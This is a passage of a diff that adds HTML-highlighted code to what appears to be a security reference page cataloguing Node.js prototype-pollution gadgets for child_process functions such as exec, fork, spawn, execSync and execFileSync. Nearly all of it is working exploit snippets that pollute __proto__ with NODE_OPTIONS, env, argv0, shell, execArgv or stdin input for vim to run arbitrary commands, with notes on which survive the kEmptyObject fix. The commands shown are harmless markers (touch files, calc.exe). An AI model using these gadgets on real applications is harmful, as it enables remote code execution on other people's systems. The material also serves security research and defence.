+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">NODE_OPTIONS</span> <span class="o">=</span> <span class="s2">"--require /proc/self/cmdline"</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">exec</span><span class="p">(</span><span class="s1">'something'</span><span class="p">);</span>
+
+
+<span class="c1">// Windows</span>
+<span class="c1">// Working after kEmptyObject (fix)</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">exec</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="nx">p</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">shell</span> <span class="o">=</span> <span class="s2">"\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">exec</span><span class="p">(</span><span class="s1">'something'</span><span class="p">);</span>
+</pre></div>
+<h4 data-content="1" id="d9db3d2da9a10a037fae1dd453395eeb">execFile</h4>
+<div class="highlight"><pre><span></span><span class="c1">// environ trick - working</span>
+<span class="c1">// Working after kEmptyObject (fix)</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">fork</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="nx">b</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="nx">b</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">env</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">"EVIL"</span><span class="o">:</span><span class="s2">"console.log(require('child_process').execSync('touch /tmp/fork-environ').toString())//"</span><span class="p">}</span>
+<span class="nx">b</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">NODE_OPTIONS</span> <span class="o">=</span> <span class="s2">"--require /proc/self/environ"</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">fork</span><span class="p">(</span><span class="s1">'something'</span><span class="p">);</span>
+
+<span class="c1">// cmdline trick - working</span>
+<span class="c1">// Working after kEmptyObject (fix)</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">fork</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="nx">p</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">=</span> <span class="s2">"console.log(require('child_process').execSync('touch /tmp/fork-cmdline').toString())//"</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">NODE_OPTIONS</span> <span class="o">=</span> <span class="s2">"--require /proc/self/cmdline"</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">fork</span><span class="p">(</span><span class="s1">'something'</span><span class="p">);</span>
+
+<span class="c1">// execArgv trick - working</span>
+<span class="c1">// Only the fork method has this attribute</span>
+<span class="c1">// Working after kEmptyObject (fix)</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">fork</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="nx">b</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="nx">b</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">execPath</span> <span class="o">=</span> <span class="s2">"/bin/sh"</span>
+<span class="nx">b</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">=</span> <span class="s2">"/bin/sh"</span>
+<span class="nx">b</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">execArgv</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"-c"</span><span class="p">,</span> <span class="s2">"touch /tmp/fork-execArgv"</span><span class="p">]</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">fork</span><span class="p">(</span><span class="s1">'./a_file.js'</span><span class="p">);</span>
+
+<span class="c1">// Windows</span>
+<span class="c1">// Working after kEmptyObject (fix)</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">fork</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="nx">b</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="nx">b</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">execPath</span> <span class="o">=</span> <span class="s2">"\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">fork</span><span class="p">(</span><span class="s1">'./a_file.js'</span><span class="p">);</span>
+</pre></div>
+<h4 data-content="1" id="3b4c700f0f10809bb273e6977387b8fe">span</h4>
+<div class="highlight"><pre><span></span><span class="c1">// environ trick - working with small variation (shell and argv0)</span>
+<span class="c1">// NOT working after kEmptyObject (fix) without options</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">spawn</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="nx">p</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="c1">// If in windows or mac you need to change the following params to the path of ndoe</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">=</span> <span class="s2">"/proc/self/exe"</span> <span class="c1">//You need to make sure the node executable is executed</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">shell</span> <span class="o">=</span> <span class="s2">"/proc/self/exe"</span> <span class="c1">//You need to make sure the node executable is executed</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">env</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">"EVIL"</span><span class="o">:</span><span class="s2">"console.log(require('child_process').execSync('touch /tmp/spawn-environ').toString())//"</span><span class="p">}</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">NODE_OPTIONS</span> <span class="o">=</span> <span class="s2">"--require /proc/self/environ"</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">spawn</span><span class="p">(</span><span class="s1">'something'</span><span class="p">);</span>
+<span class="c1">//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)</span>
+
+
+<span class="c1">// cmdline trick - working with small variation (shell)</span>
+<span class="c1">// NOT working after kEmptyObject (fix) without options</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">spawn</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="nx">p</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">shell</span> <span class="o">=</span> <span class="s2">"/proc/self/exe"</span> <span class="c1">//You need to make sure the node executable is executed</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">=</span> <span class="s2">"console.log(require('child_process').execSync('touch /tmp/spawn-cmdline').toString())//"</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">NODE_OPTIONS</span> <span class="o">=</span> <span class="s2">"--require /proc/self/cmdline"</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">spawn</span><span class="p">(</span><span class="s1">'something'</span><span class="p">);</span>
+<span class="c1">//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)</span>
+
+
+<span class="c1">// Windows</span>
+<span class="c1">// NOT working after require(fix) without options</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">spawn</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="nx">p</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">shell</span> <span class="o">=</span> <span class="s2">"\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">spawn</span><span class="p">(</span><span class="s1">'something'</span><span class="p">);</span>
+<span class="c1">//var proc = spawn('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)</span>
+</pre></div>
+<h4 data-content="1" id="b9ba0886cfc64ca9c2e4a6f7cfb550b0">execFileSync</h4>
+<div class="highlight"><pre><span></span><span class="c1">// environ trick - working with small variation (shell and argv0)</span>
+<span class="c1">// Working after kEmptyObject (fix)</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">execFileSync</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="nx">p</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="c1">// If in windows or mac you need to change the following params to the path of ndoe</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">=</span> <span class="s2">"/proc/self/exe"</span> <span class="c1">//You need to make sure the node executable is executed</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">shell</span> <span class="o">=</span> <span class="s2">"/proc/self/exe"</span> <span class="c1">//You need to make sure the node executable is executed</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">env</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">"EVIL"</span><span class="o">:</span><span class="s2">"console.log(require('child_process').execSync('touch /tmp/execFileSync-environ').toString())//"</span><span class="p">}</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">NODE_OPTIONS</span> <span class="o">=</span> <span class="s2">"--require /proc/self/environ"</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">execFileSync</span><span class="p">(</span><span class="s1">'something'</span><span class="p">);</span>
+
+<span class="c1">// cmdline trick - working with small variation (shell)</span>
+<span class="c1">// Working after kEmptyObject (fix)</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">execFileSync</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="nx">p</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">shell</span> <span class="o">=</span> <span class="s2">"/proc/self/exe"</span> <span class="c1">//You need to make sure the node executable is executed</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">=</span> <span class="s2">"console.log(require('child_process').execSync('touch /tmp/execFileSync-cmdline').toString())//"</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">NODE_OPTIONS</span> <span class="o">=</span> <span class="s2">"--require /proc/self/cmdline"</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">execFileSync</span><span class="p">(</span><span class="s1">'something'</span><span class="p">);</span>
+
+<span class="c1">// stdin trick - working</span>
+<span class="c1">// Working after kEmptyObject (fix)</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">execFileSync</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="nx">p</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">=</span> <span class="s2">"/usr/bin/vim"</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">shell</span> <span class="o">=</span> <span class="s2">"/usr/bin/vim"</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">input</span> <span class="o">=</span> <span class="s1">':!{touch /tmp/execFileSync-stdin}\n'</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">execFileSync</span><span class="p">(</span><span class="s1">'something'</span><span class="p">);</span>
+
+<span class="c1">// Windows</span>
+<span class="c1">// Working after kEmptyObject (fix)</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">execSync</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="nx">p</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">shell</span> <span class="o">=</span> <span class="s2">"\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">=</span> <span class="s2">"\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">execSync</span><span class="p">(</span><span class="s1">'something'</span><span class="p">);</span>
+</pre></div>
+<h4 data-content="1" id="98517145ddf9a26f047c876b4535566e">execSync</h4>
+<div class="highlight"><pre><span></span><span class="c1">// environ trick - working with small variation (shell and argv0)</span>
+<span class="c1">// Working after kEmptyObject (fix)</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">execSync</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="nx">p</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="c1">// If in windows or mac you need to change the following params to the path of ndoe</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">=</span> <span class="s2">"/proc/self/exe"</span> <span class="c1">//You need to make sure the node executable is executed</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">shell</span> <span class="o">=</span> <span class="s2">"/proc/self/exe"</span> <span class="c1">//You need to make sure the node executable is executed</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">env</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">"EVIL"</span><span class="o">:</span><span class="s2">"console.log(require('child_process').execSync('touch /tmp/execSync-environ').toString())//"</span><span class="p">}</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">NODE_OPTIONS</span> <span class="o">=</span> <span class="s2">"--require /proc/self/environ"</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">execSync</span><span class="p">(</span><span class="s1">'something'</span><span class="p">);</span>
+
+<span class="c1">// cmdline trick - working with small variation (shell)</span>
+<span class="c1">// Working after kEmptyObject (fix)</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">execSync</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="nx">p</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">shell</span> <span class="o">=</span> <span class="s2">"/proc/self/exe"</span> <span class="c1">//You need to make sure the node executable is executed</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">=</span> <span class="s2">"console.log(require('child_process').execSync('touch /tmp/execSync-cmdline').toString())//"</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">NODE_OPTIONS</span> <span class="o">=</span> <span class="s2">"--require /proc/self/cmdline"</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">execSync</span><span class="p">(</span><span class="s1">'something'</span><span class="p">);</span>
+
+<span class="c1">// stdin trick - working</span>
+<span class="c1">// Working after kEmptyObject (fix)</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">execSync</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="nx">p</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">argv0</span> <span class="o">=</span> <span class="s2">"/usr/bin/vim"</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">shell</span> <span class="o">=</span> <span class="s2">"/usr/bin/vim"</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">input</span> <span class="o">=</span> <span class="s1">':!{touch /tmp/execSync-stdin}\n'</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">execSync</span><span class="p">(</span><span class="s1">'something'</span><span class="p">);</span>
+
+<span class="c1">// Windows</span>
+<span class="c1">// Working after kEmptyObject (fix)</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">execSync</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+<span class="nx">p</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">shell</span> <span class="o">=</span> <span class="s2">"\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"</span>
+<span class="kd">var</span> <span class="nx">proc</span> <span class="o">=</span> <span class="nx">execSync</span><span class="p">(</span><span class="s1">'something'</span><span class="p">);</span>
+</pre></div>
+</div>
+</div>
